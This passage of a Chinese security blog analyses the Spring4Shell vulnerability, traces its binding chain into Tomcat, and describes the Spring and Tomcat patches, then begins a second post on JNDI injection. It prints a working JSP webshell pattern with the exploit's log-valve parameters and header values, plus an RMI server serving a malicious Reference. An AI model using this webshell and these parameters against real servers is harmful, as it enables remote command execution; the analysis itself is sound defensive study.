<p>那实际运行过程中的调用链是怎样的呢？<code>SomeClass</code>是哪个类呢？带着这些问题，我们在前置知识中提到的实现SpringMVC参数绑定的主要方法<code>WebDataBinder.doBind(MutablePropertyValues)</code>上设置断点。</p>
<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228874000-3cpvfu.png-w331s" alt="image"></p>
<p>经过一系列的调用逻辑后，我们来到<code>AbstractNestablePropertyAccessor</code>第814行，<code>getPropertyAccessorForPropertyPath(String)</code>方法。该方法通过递归调用自身，实现对<code>class.module.classLoader.resources.context.parent.pipeline.first.pattern</code>的递归解析，设置整个调用链。</p>
<p>我们重点关注第820行，<code>AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);</code>，该行主要实现每层嵌套参数的获取。我们在该行设置断点，查看每次递归解析过程中各个变量的值，以及如何获取每层嵌套参数。</p>
<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228875000-4ilmni.png-w331s" alt="image"></p>
<h4 id="第一轮迭代"><a href="#第一轮迭代" class="headerlink" title="第一轮迭代"></a>第一轮迭代</h4><p>进入<code>getPropertyAccessorForPropertyPath(String)</code>方法前： - <code>this</code>：<code>User</code>的<code>BeanWrapperImpl</code>包装实例 - <code>propertyPath</code>：<code>class.module.classLoader.resources.context.parent.pipeline.first.pattern</code> - <code>nestedPath</code>：<code>module.classLoader.resources.context.parent.pipeline.first.pattern</code> - <code>nestedProperty</code>：<code>class</code>，即本轮迭代需要解析的嵌套参数</p>
<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228875000-5btvip.png-w331s" alt="image"></p>
<p>进入方法，经过一系列的调用逻辑后，最终来到<code>BeanWrapperImpl</code>第308行，<code>BeanPropertyHandler.getValue()</code>方法中。可以看到<code>class</code>嵌套参数最终通过反射调用<code>User</code>的父类<code>java.lang.Object.getClass()</code>，获得返回<code>java.lang.Class</code>实例。</p>
<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228876000-6wxqle.png-w331s" alt="image"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getPropertyAccessorForPropertyPath(String)`方法返回后： - `this`：`User`的`BeanWrapperImpl`包装实例 - `propertyPath`：`class.module.classLoader.resources.context.parent.pipeline.first.pattern` - `nestedPath`：`module.classLoader.resources.context.parent.pipeline.first.pattern`，作为下一轮迭代的`propertyPath` - `nestedProperty`：`class`，即本轮迭代需要解析的嵌套参数 - `nestedPa`：`java.lang.Class`的`BeanWrapperImpl`包装实例，作为下一轮迭代的`this</span><br></pre></td></tr></table></figure>

<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228877000-7emhje.png-w331s" alt="image"></p>
<p>经过第一轮迭代，我们可以得出第一层调用链：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User.getClass()</span><br><span class="line">    java.lang.Class.get???() <span class="comment">// 下一轮迭代实现</span></span><br></pre></td></tr></table></figure>

<h4 id="第二轮迭代"><a href="#第二轮迭代" class="headerlink" title="第二轮迭代"></a>第二轮迭代</h4><p><img src="https://images.seebug.org/content/images/2022/04/06/1649228878000-8chgbm.png-w331s" alt="image"></p>
<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228879000-9gzvlg.png-w331s" alt="image"></p>
<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228880000-10cvorg.png-w331s" alt="image"></p>
<p><code>module</code>嵌套参数最终通过反射调用<code>java.lang.Class.getModule()</code>，获得返回<code>java.lang.Module</code>实例。</p>
<p>经过第二轮迭代，我们可以得出第二层调用链：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User.getClass()</span><br><span class="line">    java.lang.Class.getModule()</span><br><span class="line">        java.lang.Module.get???() <span class="comment">// 下一轮迭代实现</span></span><br></pre></td></tr></table></figure>

<h4 id="第三轮迭代"><a href="#第三轮迭代" class="headerlink" title="第三轮迭代"></a>第三轮迭代</h4><p><img src="https://images.seebug.org/content/images/2022/04/06/1649228882000-11zhlig.png-w331s" alt="image"></p>
<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228883000-12jcrzw.png-w331s" alt="image"></p>
<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228884000-13niqxk.png-w331s" alt="image"></p>
<p><code>classLoader</code>嵌套参数最终通过反射调用<code>java.lang.Module.getClassLoader()</code>，获得返回<code>org.apache.catalina.loader.ParallelWebappClassLoader</code>实例。</p>
<p>经过第三轮迭代，我们可以得出第三层调用链：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User.getClass()</span><br><span class="line">    java.lang.Class.getModule()</span><br><span class="line">        java.lang.Module.getClassLoader()</span><br><span class="line">            org.apache.catalina.loader.ParallelWebappClassLoader.get???() <span class="comment">// 下一轮迭代实现</span></span><br></pre></td></tr></table></figure>

<p>接着按照上述调试方法，依次调试剩余的递归轮次并观察相应的变量，最终可以得到如下完整的调用链：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">User.getClass()</span><br><span class="line">    java.lang.Class.getModule()</span><br><span class="line">        java.lang.Module.getClassLoader()</span><br><span class="line">            org.apache.catalina.loader.ParallelWebappClassLoader.getResources()</span><br><span class="line">                org.apache.catalina.webresources.StandardRoot.getContext()</span><br><span class="line">                    org.apache.catalina.core.StandardContext.getParent()</span><br><span class="line">                        org.apache.catalina.core.StandardHost.getPipeline()</span><br><span class="line">                            org.apache.catalina.core.StandardPipeline.getFirst()</span><br><span class="line">                                org.apache.catalina.valves.AccessLogValve.setPattern()</span><br></pre></td></tr></table></figure>

<p>可以看到，<code>pattern</code>参数最终对应<code>AccessLogValve.setPattern()</code>，即将<code>AccessLogValve</code>的<code>pattern</code>属性设置为<code>%&#123;c2&#125;i if(&quot;j&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = %&#123;c1&#125;i.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; %&#123;suffix&#125;i</code>，也就是access_log的文件内容格式。</p>
<p>我们再来看<code>pattern</code>参数值，除了常规的Java代码外，还夹杂了三个特殊片段。通过翻阅<code>AccessLogValve</code>的父类<code>AbstractAccessLogValve</code>的源码，可以找到相关的文档：</p>
<p><img src="https://images.seebug.org/content/images/2022/04/598fe68b-b0e7-4f9a-b5be-18a42d50dd17.png-w331s" alt="img"></p>
<p>即通过<code>AccessLogValve</code>输出的日志中可以通过形如<code>%&#123;param&#125;i</code>等形式直接引用HTTP请求和响应中的内容。完整文档请参考文章末尾的参考章节。</p>
<p>结合poc.py中<code>headers</code>变量内容：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&quot;suffix&quot;</span>:<span class="string">&quot;%&gt;//&quot;</span>,</span><br><span class="line">            <span class="string">&quot;c1&quot;</span>:<span class="string">&quot;Runtime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;c2&quot;</span>:<span class="string">&quot;&lt;%&quot;</span>,</span><br><span class="line">            <span class="string">&quot;DNT&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终可以得到<code>AccessLogValve</code>输出的日志实际内容如下（已格式化）：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;j&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span><br><span class="line">    java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">    <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">    <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">        out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;<span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p>很明显，这是一个JSP webshell。这个webshell输出到了哪儿？名称是什么？能被直接访问和正常解析执行吗？我们接下来看其余的参数。</p>
<h4 id="3-1-2-suffix参数"><a href="#3-1-2-suffix参数" class="headerlink" title="3.1.2 suffix参数"></a>3.1.2 <code>suffix</code>参数</h4><ul>
<li>参数名：<code>class.module.classLoader.resources.context.parent.pipeline.first.suffix</code></li>
<li>参数值：<code>.jsp</code></li>
</ul>
<p>按照<code>pattern</code>参数相同的调试方法，<code>suffix</code>参数最终将<code>AccessLogValve.suffix</code>设置为<code>.jsp</code>，即access_log的文件名后缀。</p>
<h4 id="3-1-3-directory参数"><a href="#3-1-3-directory参数" class="headerlink" title="3.1.3 directory参数"></a>3.1.3 <code>directory</code>参数</h4><ul>
<li>参数名：<code>class.module.classLoader.resources.context.parent.pipeline.first.directory</code></li>
<li>参数值：<code>webapps/ROOT</code></li>
</ul>
<p>按照<code>pattern</code>参数相同的调试方法，<code>directory</code>参数最终将<code>AccessLogValve.directory</code>设置为<code>webapps/ROOT</code>，即access_log的文件输出目录。</p>
<p>这里提下<code>webapps/ROOT</code>目录，该目录为Tomcat Web应用根目录。部署到目录下的Web应用，可以直接通过<code>http://localhost:8080/</code>根目录访问。</p>
<h4 id="3-1-4-prefix参数"><a href="#3-1-4-prefix参数" class="headerlink" title="3.1.4 prefix参数"></a>3.1.4 <code>prefix</code>参数</h4><ul>
<li>参数名：<code>class.module.classLoader.resources.context.parent.pipeline.first.prefix</code></li>
<li>参数值：<code>tomcatwar</code></li>
</ul>
<p>按照<code>pattern</code>参数相同的调试方法，<code>prefix</code>参数最终将<code>AccessLogValve.prefix</code>设置为<code>tomcatwar</code>，即access_log的文件名前缀。</p>
<h4 id="3-1-5-fileDateFormat参数"><a href="#3-1-5-fileDateFormat参数" class="headerlink" title="3.1.5 fileDateFormat参数"></a>3.1.5 <code>fileDateFormat</code>参数</h4><ul>
<li>参数名：<code>class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat</code></li>
<li>参数值：空</li>
</ul>
<p>按照<code>pattern</code>参数相同的调试方法，<code>fileDateFormat</code>参数最终将<code>AccessLogValve.fileDateFormat</code>设置为空，即access_log的文件名不包含日期。</p>
<h4 id="3-1-6-总结"><a href="#3-1-6-总结" class="headerlink" title="3.1.6 总结"></a>3.1.6 总结</h4><p>至此，经过上述的分析，结论非常清晰了：通过请求传入的参数，利用SpringMVC参数绑定机制，控制了Tomcat <code>AccessLogValve</code>的属性，让Tomcat在<code>webapps/ROOT</code>目录输出定制的“访问日志”<code>tomcatwar.jsp</code>，该“访问日志”实际上为一个JSP webshell。</p>
<p>在SpringMVC参数绑定的实际调用链中，有几个关键点直接影响到了漏洞能否成功利用。</p>
<h3 id="3-2-漏洞利用关键点"><a href="#3-2-漏洞利用关键点" class="headerlink" title="3.2 漏洞利用关键点"></a>3.2 漏洞利用关键点</h3><h4 id="3-2-1-关键点一：Web应用部署方式"><a href="#3-2-1-关键点一：Web应用部署方式" class="headerlink" title="3.2.1 关键点一：Web应用部署方式"></a>3.2.1 关键点一：Web应用部署方式</h4><p>从<code>java.lang.Module</code>到<code>org.apache.catalina.loader.ParallelWebappClassLoader</code>，是将调用链转移到Tomcat，并最终利用<code>AccessLogValve</code>输出webshell的关键。</p>
<p><code>ParallelWebappClassLoader</code>在Web应用以war包部署到Tomcat中时使用到。现在很大部分公司会使用SpringBoot可执行jar包的方式运行Web应用，在这种方式下，我们看下<code>classLoader</code>嵌套参数被解析为什么，如下图：</p>
<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228885000-15gfwwg.png-w331s" alt="image"></p>
<p>可以看到，使用SpringBoot可执行jar包的方式运行，<code>classLoader</code>嵌套参数被解析为<code>org.springframework.boot.loader.LaunchedURLClassLoader</code>，查看其源码，没有<code>getResources()</code>方法。具体源码请参考文章末尾的参考章节。</p>
<p>这就是为什么本漏洞利用条件之一，Web应用部署方式需要是Tomcat war包部署。</p>
<h4 id="3-2-2-关键点二：JDK版本"><a href="#3-2-2-关键点二：JDK版本" class="headerlink" title="3.2.2 关键点二：JDK版本"></a>3.2.2 关键点二：JDK版本</h4><p>在前面章节中<code>AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);</code>调用的过程中，实际上Spring做了一道防御。</p>
<p>Spring使用<code>org.springframework.beans.CachedIntrospectionResults</code>缓存并返回Java Bean中可以被<code>BeanWrapperImpl</code>使用的<code>PropertyDescriptor</code>。在<code>CachedIntrospectionResults</code>第289行构造方法中：</p>
<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228886000-16ewyaz.png-w331s" alt="image"></p>
<p>该行的意思是：当Bean的类型为<code>java.lang.Class</code>时，不返回<code>classLoader</code>和<code>protectionDomain</code>的<code>PropertyDescriptor</code>。Spring在构建嵌套参数的调用链时，会根据<code>CachedIntrospectionResults</code>缓存的<code>PropertyDescriptor</code>进行构建：</p>
<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228887000-17stdlu.png-w331s" alt="image"></p>
<p>不返回，也就意味着<code>class.classLoader...</code>这种嵌套参数走不通，即形如下方的调用链：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Foo.getClass()</span><br><span class="line">    java.lang.Class.getClassLoader()</span><br><span class="line">        BarClassLoader.getBaz()</span><br><span class="line">            ......</span><br></pre></td></tr></table></figure>

<p>这在JDK&lt;&#x3D;1.8都是有效的。但是在JDK 1.9之后，Java为了支持模块化，在<code>java.lang.Class</code>中增加了<code>module</code>属性和对应的<code>getModule()</code>方法，自然就能通过如下调用链绕过判断：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Foo.getClass()</span><br><span class="line">    java.lang.Class.getModule() <span class="comment">// 绕过</span></span><br><span class="line">        java.lang.Module.getClassLoader()</span><br><span class="line">            BarClassLoader.getBaz()</span><br><span class="line">                ......</span><br></pre></td></tr></table></figure>

<p>这就是为什么本漏洞利用条件之二，JDK&gt;&#x3D;1.9。</p>
<h2 id="四、补丁分析"><a href="#四、补丁分析" class="headerlink" title="四、补丁分析"></a>四、补丁分析</h2><h3 id="4-1-Spring-5-3-18补丁"><a href="#4-1-Spring-5-3-18补丁" class="headerlink" title="4.1 Spring 5.3.18补丁"></a>4.1 Spring 5.3.18补丁</h3><p>通过对比Spring 5.3.17和5.3.18的版本，可以看到在3月31日有一项名为“Redefine PropertyDescriptor filter的”提交。</p>
<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228887000-18iwnlm.png-w331s" alt="image"></p>
<p>进入该提交，可以看到对<code>CachedIntrospectionResults</code>构造函数中Java Bean的<code>PropertyDescriptor</code>的过滤条件被修改了：当Java Bean的类型为<code>java.lang.Class</code>时，仅允许获取<code>name</code>以及<code>Name</code>后缀的属性描述符。在章节<code>3.2.2 关键点二：JDK版本</code>中，利用<code>java.lang.Class.getModule()</code>的链路就走不通了。</p>
<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228888000-19qrkrw.png-w331s" alt="image"></p>
<h3 id="4-2-Tomcat-9-0-62补丁"><a href="#4-2-Tomcat-9-0-62补丁" class="headerlink" title="4.2 Tomcat 9.0.62补丁"></a>4.2 Tomcat 9.0.62补丁</h3><p>通过对比Tomcat 9.0.61和9.0.62的版本，可以看到在4月1日有一项名为“Security hardening. Deprecate getResources() and always return null.”提交。</p>
<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228888000-20muaoq.png-w331s" alt="image"></p>
<p>进入该提交，可以看到对<code>getResource()</code>方法的返回值做了修改，直接返回<code>null</code>。<code>WebappClassLoaderBase</code>即<code>ParallelWebappClassLoader</code>的父类，在章节<code>3.2.1 关键点一：Web应用部署方式</code>中，利用<code>org.apache.catalina.loader.ParallelWebappClassLoader.getResources()</code>的链路就走不通了。</p>
<p><img src="https://images.seebug.org/content/images/2022/04/06/1649228888000-21irivm.png-w331s" alt="image"></p>
<h2 id="五、思考"><a href="#五、思考" class="headerlink" title="五、思考"></a>五、思考</h2><p>通过将代码输出到日志文件，并控制日志文件被解释执行，这在漏洞利用方法中也较为常见。通常事先往服务器上写入包含代码的“日志”文件，并利用文件包含漏洞解释执行该“日志”文件。写入“日志”文件可以通过Web服务中间件自身的日志记录功能顺带实现，也可以通过SQL注入、文件上传漏洞等曲线实现。</p>
<p>与上文不同的是，本次漏洞并不需要文件包含。究其原因，Java Web服务中间件自身也是用Java编写和运行的，而部署运行在上面的Java Web应用，实际上是Java Web服务中间件进程的一部分，两者间通过Servlet API标准接口在进程内部进行“通讯”。依靠Java语言强大的运行期反射能力，给予了攻击者可以通过Java Web应用漏洞进而攻击Java Web服务中间件的能力。也就是本次利用Web应用自身的Spring漏洞，进而修改了Web服务中间件Tomcat的access_log配置内容，直接输出可执行的“日志”文件到Web 应用目录下。</p>
<p>在日常开发中，应该严格控制Web应用可解释执行目录为只读不可写，日志、上传文件等运行期可以修改的目录应该单独设置，并且不可执行。</p>
<p>本次漏洞虽然目前调用链中仅利用到了Tomcat，但只要存在一个从Web应用到Web服务中间件的<code>class.module.classLoader....</code>合适调用链，理论上Jetty、Weblogic、Glassfish等也可利用。另外，目前通过写入日志文件的方式，也可能通过其它文件，比如配置文件，甚至是内存马的形式出现。</p>
<p>本次漏洞目前唯一令人“欣慰”的一点是，仅对JDK&gt;&#x3D;1.9有效。相信不少公司均为“版本任你发，我用Java 8！”的状态，但这也仅仅是目前。与其抱着侥幸心理，不如按计划老老实实升级Spring。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li>Tomcat access_log配置参考文档：<a target="_blank" rel="noopener" href="https://tomcat.apache.org/tomcat-9.0-doc/config/valve.html#Access_Logging">https://tomcat.apache.org/tomcat-9.0-doc/config/valve.html#Access_Logging</a></li>
<li>Spring 5.3.17和5.3.18版本比较：<a target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-framework/compare/v5.3.17...v5.3.18">https://github.com/spring-projects/spring-framework/compare/v5.3.17...v5.3.18</a></li>
<li>Spring 5.3.18补丁提交内容：<a target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15">https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15</a></li>
<li>Tomcat 9.0.61和9.0.62版本比较：<a target="_blank" rel="noopener" href="https://github.com/apache/tomcat/compare/9.0.61...9.0.62">https://github.com/apache/tomcat/compare/9.0.61...9.0.62</a></li>
<li>Tomcat 9.0.62补丁提交内容：<a target="_blank" rel="noopener" href="https://github.com/apache/tomcat/commit/8a904f6065080409a1e00606cd7bceec6ad8918c">https://github.com/apache/tomcat/commit/8a904f6065080409a1e00606cd7bceec6ad8918c</a></li>
<li>LaunchedURLClassLoader源码：<a target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-boot/blob/main/spring-boot-project/spring-boot-tools/spring-boot-loader/src/main/java/org/springframework/boot/loader/LaunchedURLClassLoader.java">https://github.com/spring-projects/spring-boot/blob/main/spring-boot-project/spring-boot-tools/spring-boot-loader/src/main/java/org/springframework/boot/loader/LaunchedURLClassLoader.java</a></li>
</ul>

	
	</div>
  <a type="button" href="/2024/01/19/Spring4Shell漏洞/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2024/01/16/JNDI注入/" >JNDI注入</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2024-01-16
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>原文：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LittleHann/p/17768907.html">https://www.cnblogs.com/LittleHann/p/17768907.html</a></p>
</blockquote>
<h2 id="一、JNDI-简介"><a href="#一、JNDI-简介" class="headerlink" title="一、JNDI 简介"></a>一、JNDI 简介</h2><h3 id="JNDI是什么"><a href="#JNDI是什么" class="headerlink" title="JNDI是什么"></a>JNDI是什么</h3><p>JNDI（Java Naming and Directory Interface）是一个应用程序设计的 API，一种标准的 Java 命名系统接口。</p>
<p>JNDI 提供统一的客户端 API，通过不同的JNDI服务供应接口（SPI）的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。</p>
<p>通俗的说就是若程序定义了 JDNI 中的接口，则就可以通过该接口 API 访问系统的命令服务和目录服务，如下图。</p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231017091310052-287770077.png" alt="img"></p>
<table>
<thead>
<tr>
<th>协议</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>LDAP</td>
<td>轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容</td>
</tr>
<tr>
<td>RMI</td>
<td>JAVA 远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象</td>
</tr>
<tr>
<td>DNS</td>
<td>域名服务</td>
</tr>
<tr>
<td>CORBA</td>
<td>公共对象请求代理体系结构</td>
</tr>
</tbody></table>
<p>J2EE规范要求所有的J2EE容器都要提供JNDI规范的实现。JNDI就成为了J2EE组件在运行期间间接地查找其他组件、资源或服务的通用机制。JNDI在J2EE中主要角色就是提供间接层，这样组件可以发现所需资源，不用了解间接性。</p>
<h3 id="JNDI解决了什么问题"><a href="#JNDI解决了什么问题" class="headerlink" title="JNDI解决了什么问题"></a>JNDI解决了什么问题</h3><p>没有JNDI之前，对于一个外部依赖，像Mysql数据库，程序开发的过程中需要将具体的数据库地址参数写入到Java代码中，程序才能找到具体的数据库地址进行链接。那么数据库配置这些信息可能经常变动的。这就需要开发经常手动去调整配置。有了JNDI后，程序员可以不去管数据库相关的配置信息，这些配置都交给J2EE容器来配置和管理，程序员只要对这些配置和管理进行引用即可。其实就是给资源起个名字，再根据名字来找资源。</p>
<h2 id="二、JNDI注入原理分析"><a href="#二、JNDI注入原理分析" class="headerlink" title="二、JNDI注入原理分析"></a>二、JNDI注入原理分析</h2><p>JNDI 注入，即当开发者在定义 <code>JNDI</code> 接口初始化时，<code>lookup()</code> 方法的参数被外部攻击者可控，攻击者就可以将恶意的 <code>url</code> 传入参数，以此劫持被攻击的Java客户端的JNDI请求指向恶意的服务器地址，恶意的资源服务器地址响应了一个恶意Java对象载荷（reference实例 or 序列化实例），对象在被解析实例化，实例化的过程造成了注入攻击。不同的注入方法区别主要就在于利用实例化注入的方式不同。</p>
<p>一个简单的漏洞代码示例如下，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jndi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>;    <span class="comment">// 指定查找的 uri 变量</span></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">// 得到初始目录环境的一个引用</span></span><br><span class="line">        initialContext.lookup(uri); <span class="comment">// 获取指定的远程对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码中定义了 uri 变量，uri 变量可控，并定义了一个 rmi 协议服务， rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Exploit 为攻击者控制的链接，最后使用 lookup() 函数进行远程获取 Exploit 类（Exploit 类名为攻击者定义，不唯一），并执行它。</p>
<p>服务端攻击代码，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);        <span class="comment">// rmi监听端口</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calculator&quot;</span>,<span class="string">&quot;Calculator&quot;</span>,<span class="string">&quot;http://127.0.0.1:8081/&quot;</span>);    <span class="comment">// payload攻击载荷地址</span></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;Exploit&quot;</span>,wrapper);                               <span class="comment">//rmi绑定服务名称</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231017092702964-1282132103.png" alt="img"></p>
<p>我们深入到源码级别研究一下产生漏洞的原因。 先关注受攻击客户端。</p>
<p>InitialContext 类用于读取 JNDI 的一些配置信息，内含对象和其在 JNDI 中的注册名称的映射信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InitialContext initialContext = new InitialContext(); // 初始化上下文,获取初始目录环境的一个引用</span><br></pre></td></tr></table></figure>

<p>lookup(String name) 获取 name 的数据，这里的 uri 被定义为 rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Exploit 所以会通过 rmi 协议访问 127.0.0.1:1099&#x2F;Exploit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String uri = &quot;rmi://127.0.0.1:1099/Exploit&quot;;    // 指定查找的 uri 变量</span><br><span class="line">initialContext.lookup(uri); // 获取指定的远程对象</span><br></pre></td></tr></table></figure>

<p>由于 <code>lookup()</code> 参数可控，导致漏洞的出现，跟进代码如下，</p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231018135308607-619950912.png" alt="img"></p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231018135707263-24409907.png" alt="img"></p>
<p>以LDAP为例，获得远程LDAPServer的Entry之后，跟进跟进com&#x2F;sun&#x2F;jndi&#x2F;ldap&#x2F;Obj.java#decodeObject，</p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231018141418437-467427681.png" alt="img"></p>
<p>按照该函数的注释来看，其主要功能是解码从LDAP Server来的对象，</p>
<ul>
<li>该对象可能是序列化的对象</li>
<li>也可能是一个Reference对象</li>
</ul>
